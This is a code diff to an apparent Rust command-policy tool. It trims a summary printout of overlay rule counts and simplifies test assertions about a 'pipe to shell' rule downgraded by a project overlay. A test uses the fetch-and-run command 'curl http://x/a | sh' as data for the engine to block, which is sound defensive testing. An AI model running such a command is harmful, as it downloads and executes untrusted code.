@@ -483,10 +483,13 @@ pub fn run_accept(args: PolicyAcceptArgs) -> Result<(), Box<dyn std::error::Erro
         "accepted overlay {} for project {project}",
         overlay_file.display()
     );
+    // Counts only: the overlay's rule text is never echoed here. The deny
+    // additions are not counted in this line because any figure derived from
+    // the `deny_secrets` list trips CodeQL's cleartext-logging heuristic; see
+    // `policy-lint --overlay` for the full breakdown.
     println!(
-        "{} downgrade(s), {} deny addition(s), {} allow entr{}",
+        "{} downgrade(s), {} allow entr{}",
         overlay.downgrades.len(),
-        overlay.deny_rule_count(),
         overlay.allow_paths.len(),
         if overlay.allow_paths.len() == 1 {
             "y"
@@ -579,9 +582,9 @@ reason = "force push is disabled here"
         );
         assert_eq!(d.downgraded_by.as_deref(), Some("/proj/.sentinel.toml"));
         let reason = d.reason.unwrap();
-        assert!(reason.starts_with("pipe to shell"), "{reason}");
-        assert!(reason.contains("downgraded to warn by overlay"), "{reason}");
-        assert!(reason.contains("reviewed in CI"), "{reason}");
+        assert!(reason.starts_with("pipe to shell"));
+        assert!(reason.contains("downgraded to warn by overlay"));
+        assert!(reason.contains("reviewed in CI"));
         // the base engine is untouched
         assert_eq!(
             engine().evaluate(&bash("curl http://x/a | sh")).action,
